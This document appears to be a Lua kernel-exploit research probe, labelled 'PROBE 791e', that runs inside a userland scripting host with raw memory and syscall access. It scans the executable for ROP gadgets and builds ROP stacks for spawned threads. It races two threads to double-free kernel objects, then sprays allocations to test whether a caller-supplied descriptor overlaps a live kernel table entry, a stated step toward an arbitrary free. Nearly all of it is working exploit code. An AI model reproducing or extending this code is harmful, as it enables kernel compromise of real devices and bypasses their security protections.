-- CRASH_CLASS: HIGH
-- PROBE 791e: alias a live table entry with a user descriptor
--
-- Context: 791d proved the barrier race doubles the delete: 39 of 48 last
-- items returned 0 from both children. With count=2 the freed set is
--   D (0x50, user bytes)  S (0x58)  T (0x30)  P (0x10)  W (0x58)  C (0x30)
-- and 0x50 does not collide with the table entry.
--
-- A count=1 block create allocates the same six objects but D is 0x28, so D,
-- T and C all land in the 0x30 class. After a double free the free list holds
-- the same chunk twice; a later create can therefore receive one chunk as its
-- D and, in the same chunk, another create's table entry T. The create's
-- copyin then writes the caller's descriptor bytes over a live T.
--
-- The delete path reads S from [T+0x10] (8ad7009f mov rdi,[r8+0x10]) and D, P
-- from W ([r12+0x20], [r12+0x28]), so a T under caller control is a candidate
-- arbitrary free: 8ad7009f frees whatever pointer we place at +0x10.
--
-- This probe does not construct that pointer yet. It measures whether the
-- aliasing happens at all: race the double free, then create a burst of
-- count=1 blocks and delete them one at a time, printing every status. A
-- duplicated chunk shows up as a wrong status, a poll that never reaches 3, or
-- a death inside the burst.

print("=== PROBE 791e: descriptor/table aliasing ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
print(string.format("[0] eboot=%X gadgets ok", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

local STACK = page*4
local function spawn_parked(fd, idpage, count, statpage)
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local p = base
    wq(p, uint64(pop_rdi)); wq(p+8,  uint64(idpage))
    wq(p+16, uint64(pop_rsi)); wq(p+24, uint64(count))
    wq(p+32, uint64(pop_rdx)); wq(p+40, uint64(statpage))
    wq(p+48, uint64(pop_rax)); wq(p+56, uint64(662))
    wq(p+64, uint64(fn))
    wq(p+72, uint64(pop_rax)); wq(p+80, uint64(431))
    wq(p+88, uint64(fn));      wq(p+96, uint64(jmp_g))
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    if not (ok and to_num(rv) == 0) then return nil, nil end
    return rd(fds), rd(fds+4)
end
local one = mmap(page)
wb(one, 0x41)

-- One descriptor page per block index, each filled with a different byte, so a
-- descriptor that lands on a live table entry writes a recognisable pattern.
local data = mmap(page*2)
wd(data+0x20, 0x2A)

local M = 48
local ids = mmap(page)
local made = 0
for k=1,M do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if okc and to_num(rvc) == 0 then
        made = made + 1
        wd(ids + (made-1)*4, rd(o) or 0)
    end
end
print(string.format("[A] count=1 blocks=%d/%d first=%08X", made, M, rd(ids) or 0))
if made ~= M then print("=== PROBE 791e ABORT ===") return end

local pp = mmap(page)
local okp, rvp = pcall(function() return mk(664)(uint64(ids), uint64(M), uint64(pp)) end)
local n3 = 0
for k=0,M-1 do if (rd(pp + k*4) or 0) == 3 then n3 = n3 + 1 end end
print(string.format("[B] poll rv=%s state3=%d/%d", tostring(to_num(rvp)), n3, M))
if n3 ~= M then print("=== PROBE 791e ABORT ===") return end

-- Barrier race: both children delete the whole list.
local r1, w1 = pairsock()
local r2, w2 = pairsock()
if not (r1 and r2) then print("[C] socketpairs failed"); return end
local sA, sB = mmap(page), mmap(page)
for i=0,M-1 do wd(sA + i*4, 0xAAAAAAAA); wd(sB + i*4, 0xBBBBBBBB) end
local okA, tidA = spawn_parked(r1, ids, M, sA)
local okB, tidB = spawn_parked(r2, ids, M, sB)
print(string.format("[C] children ok=%s/%s tids=%X/%X", tostring(okA), tostring(okB), tidA, tidB))
sleep_ms(120)
pcall(function() return mk(WRITE)(uint64(w1), uint64(one), uint64(1), uint64(0), uint64(0)) end)
pcall(function() return mk(WRITE)(uint64(w2), uint64(one), uint64(1), uint64(0), uint64(0)) end)
sleep_ms(250)

local dbl = 0
for k=0,M-1 do
    local a, b = rd(sA + k*4) or 0, rd(sB + k*4) or 0
    if a == 0 and b == 0 then dbl = dbl + 1 end
end
print(string.format("[D] double deletes=%d/%d alive", dbl, M))

-- Burst: these allocations may receive the doubly-freed chunks. Each is filled
-- with its own byte pattern, so a descriptor written over a table entry is
-- visible as a status change rather than silence.
local B = 40
local burst, bids = {}, mmap(page)
local bmade = 0
for k=1,B do
    local b = (0x41 + (k % 26))
    for i=0,0x27,4 do wd(data+i, b*0x01010101) end
    wd(data+0x20, 0x2A)
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if okc and to_num(rvc) == 0 then
        bmade = bmade + 1
        local id = rd(o) or 0
        bids = bids or 0
        wd(bids + (bmade-1)*4, id)
        burst[bmade] = id
        print(string.format("[E] %d create id=%08X", bmade, id))
    else
        print(string.format("[E] %d create failed ok=%s rv=%s", k, tostring(okc), tostring(to_num(rvc))))
        break
    end
end
print(string.format("[E] burst=%d/%d", bmade, B))

-- Poll and delete one at a time: an aliased entry shows up here.
local bad = 0
for k=1,bmade do
    local o = mmap(page)
    wd(o, burst[k])
    local qp = mmap(page)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
    local st = mmap(page)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    local ps, ds = rd(qp) or 0, rd(st) or 0
    if not (ps == 3 and ds == 0 and to_num(rv3) == 0) then bad = bad + 1 end
    print(string.format("[F] %d id=%08X poll=%s/%08X del=%s/%08X", k, burst[k], tostring(to_num(rv2)), ps, tostring(to_num(rv3)), ds))
end
print(string.format("[G] anomalies=%d/%d", bad, bmade))

local hb = 0
for k=1,8 do
    local o, qp, st = mmap(page), mmap(page), mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    if not (ok1 and to_num(rv1) == 0 and ok3 and to_num(rv3) == 0 and (rd(st) or -1) == 0) then hb = hb + 1 end
end
print(string.format("[H] health anomalies=%d/8", hb))
print("=== PROBE 791e DONE ===")
